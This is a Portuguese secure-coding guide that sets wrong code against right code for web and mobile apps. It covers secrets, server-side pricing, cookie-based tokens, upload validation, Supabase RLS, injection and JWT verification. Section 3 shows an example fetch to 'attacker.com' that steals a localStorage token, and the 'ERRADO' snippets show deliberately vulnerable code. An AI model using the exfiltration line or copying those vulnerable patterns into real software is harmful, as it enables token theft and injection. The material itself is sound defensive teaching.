# Padrões de Código — Certo vs. Errado

Carregue apenas a(s) seção(ões) relevante(s) para a tarefa em mãos.

---

## 1. Secrets & .gitignore

**Nunca** hardcode chaves, senhas, connection strings ou API keys no código-fonte.

```js
// ERRADO
const stripe = new Stripe('sk_live_ABCD1234...')
const db = new Pool({ connectionString: 'postgresql://user:senha123@db.example.com/prod' })

// CERTO
const stripe = new Stripe(process.env.STRIPE_SECRET_KEY)
const openai = new OpenAI({ apiKey: process.env.OPENAI_API_KEY })
```

Bots fazem scraping de repositórios públicos procurando padrões como `sk_live_`, `AKIA` (AWS), `AIza` (Google).

`.gitignore` mínimo para projeto Node/React:

```
.env
.env.local
.env.development.local
.env.test.local
.env.production.local
.env*.local
*.map
node_modules/
dist/
build/
.next/
*.pem
*.key
*.p12
*.pfx
*.log
npm-debug.log*
```

Source maps (`*.map`) nunca em produção — revelam código-fonte completo, nomes de variáveis/funções e lógica de negócio, facilitando engenharia reversa.

Verificar se um segredo já vazou no histórico do git:
```bash
git log --all --full-history -- "**/.env"
```
Se apareceu, o segredo está comprometido — **rotacione imediatamente**; remover do git não é suficiente, o histórico permanece. Ferramentas: `git-secrets`, `truffleHog`, `gitleaks`.

---

## 2. Preços e Pagamento (hardcoding de prices)

O preço **nunca** pode vir do cliente/frontend.

```js
// ERRADO — frontend manda o preço
fetch('/api/checkout', {
  method: 'POST',
  body: JSON.stringify({ plan: 'pro', price: 29.99 }) // usuário pode mudar isso no DevTools
})

// CERTO — servidor decide o preço a partir de um ID de plano
const PRICES = { basic: 999, pro: 2999, enterprise: 9999 } // centavos
app.post('/api/checkout', async (req, res) => {
  const { planId } = req.body
  const amount = PRICES[planId]
  if (!amount) return res.status(400).json({ error: 'Invalid plan' })
  const session = await stripe.checkout.sessions.create({
    line_items: [{ price_data: { unit_amount: amount }, quantity: 1 }],
  })
  res.json({ url: session.url })
})
```

Melhor ainda com Stripe: criar produtos/preços no dashboard e usar Price IDs (`price_1ABC...`), nunca valores numéricos vindos do cliente.

Checklist de pagamento: preço determinado pelo servidor; webhook do Stripe validando assinatura; status de assinatura atualizado via webhook (não via resposta do frontend).

---

## 3. Tokens de autenticação (onde guardar)

**Nunca** guardar token de auth em `localStorage`/`sessionStorage` — qualquer XSS consegue ler:

```js
// ataque trivial se houver XSS
fetch('https://attacker.com/steal?token=' + localStorage.getItem('auth_token'))
```

| Onde | Segurança | Facilidade |
|---|---|---|
| localStorage / sessionStorage | Baixa (XSS) | Alta |
| Cookie `HttpOnly` + `Secure` + `SameSite` | Alta | Média |
| Cookie `HttpOnly` + BFF | Alta | Baixa |
| Memória (variável JS) | Alta* | Baixa (perde ao fechar navegador) |

Padrão recomendado no servidor:
```js
res.cookie('auth_token', token, {
  httpOnly: true,   // JS não consegue ler
  secure: true,      // só em HTTPS
  sameSite: 'Lax',   // proteção contra CSRF
  maxAge: 7 * 24 * 60 * 60 * 1000
})
```

Supabase por padrão usa `localStorage` — trocar o `storage` do client para uma implementação de cookie segura quando o app for sensível.

---

## 4. Upload de arquivo e imagem

- Validar tipo de arquivo por **magic bytes** (assinatura binária), não pela extensão nem pelo `Content-Type` enviado pelo cliente — ambos são fáceis de falsificar.
- Impor limite de tamanho de arquivo no servidor.
- Reprocessar imagens (ex: com `sharp` no Node ou `pillow` no Python) para remover payloads maliciosos embutidos e metadados.
- Nunca usar o nome de arquivo enviado pelo usuário — gerar um novo nome (UUID) no servidor antes de salvar/servir.

---

## 5. Supabase / banco de dados

- **RLS (Row Level Security) habilitado em toda tabela pública.** Sem RLS, qualquer chave anon consegue ler/escrever tudo.
- Revisar toda policy: cuidado com `USING (true)` — libera acesso geral, geralmente não é intencional.
- Policies precisam ter `USING` (leitura) e `WITH CHECK` (escrita) corretos e simétricos.
- Dados sensíveis (ex: documentos, dados financeiros) em tabelas separadas com policies mais restritivas.
- **Service Role key nunca no frontend** — ela ignora RLS. Só usar em backend/servidor.

---

## 6. Rate limits

- Endpoints de login/signup: limitar tentativas (proteção contra brute force e enumeração de contas).
- Endpoints de IA: limitar chamadas por usuário/IP (proteção contra abuso de custo).
- Endpoints de email: limitar envio (proteção contra spam/phishing via seu domínio).
- **Contador de rate limit sempre no servidor** — nunca confiar em contador mantido no cliente.

---

## 7. Budget caps (chamadas de IA)

- `max_tokens` obrigatório em toda chamada de IA — sem isso, uma resposta longa (ou um loop) pode gerar custo descontrolado.
- Configurar alertas de billing em todos os provedores usados (OpenAI, Anthropic, AWS, etc).
- Implementar tracking de uso por usuário, para poder identificar e limitar abuso individual.

---

## 8. Injections

**SQL Injection** — nunca concatenar input do usuário direto na query:

```js
// ERRADO — vulnerável a SQL Injection
const user = await db.query(`SELECT * FROM users WHERE id = ${req.params.id}`)

// CERTO — query parametrizada
const user = await db.query('SELECT * FROM users WHERE id = $1', [req.params.id])
```

- Nunca usar `$queryRawUnsafe` no Prisma (ou equivalente) com input de usuário.
- Validar todo input de usuário com Zod/Yup antes de usar em qualquer query ou lógica.
- **Prompt injection**: quando o app usa IA (ex: um agente WhatsApp), ter proteção básica contra instruções maliciosas embutidas em input do usuário tentando sobrescrever o system prompt.
- Sanitizar output gerado por IA antes de renderizar como HTML (evita XSS via conteúdo gerado pela própria IA).

---

## 9. Auth & Authorization

```js
// ERRADO — não verifica assinatura do token
const payload = jwt.decode(token)

// CERTO — verifica assinatura e validade
const payload = jwt.verify(token, process.env.JWT_SECRET)
```

- **Autenticação ≠ Autorização.** Verificar que o usuário está logado não basta — cada endpoint precisa checar se ESSE usuário pode acessar ESSE recurso específico (ex: `user.id === recurso.owner_id`), não só se tem um token válido.
- Server Actions do Next.js também precisam dessa verificação — não são protegidas automaticamente só por estarem no servidor.
- Tokens de auth em cookies `HttpOnly` (ver seção 3).

---

## 10. Mobile

- **Nunca** embutir API key (OpenAI, etc) no bundle JS do app — é trivial de extrair de um APK/IPA.
- Usar um BFF (Backend For Frontend): o app mobile chama o backend próprio (autenticado), e é o backend que guarda e usa a chave secreta com o provedor externo.
- `AsyncStorage` no React Native é equivalente a `localStorage` — **não é seguro para tokens**. Usar `expo-secure-store` (Keychain no iOS / Keystore no Android).
- Deep links devem apenas navegar para uma tela — nunca executar uma ação sensível (pagamento, transferência) diretamente a partir dos parâmetros da URL sem confirmação do usuário.

---

## 11. Deployment

```js
// ERRADO — vaza stack trace e query em produção
app.use((err, req, res, next) => {
  res.status(500).json({ error: err.message, stack: err.stack, query: err.query })
})

// CERTO
app.use((err, req, res, next) => {
  console.error(err) // loga internamente
  res.status(500).json({
    error: process.env.NODE_ENV === 'production' ? 'Internal server error' : err.message
  })
})
```

- Source maps desabilitados em produção (`sourcemap: false` no Vite/Vitest; `productionBrowserSourceMaps: false` no Next.js).
- Security headers via `helmet` (Node) ou headers manuais no `next.config.js`: `Content-Security-Policy`, `X-Frame-Options`, `X-Content-Type-Options`, `Strict-Transport-Security`, `Referrer-Policy`.
- Bloquear acesso HTTP à pasta `.git` no servidor (Nginx: `location ~ /\.git { deny all; return 404; }`) — se acessível, permite reconstruir todo o código-fonte.
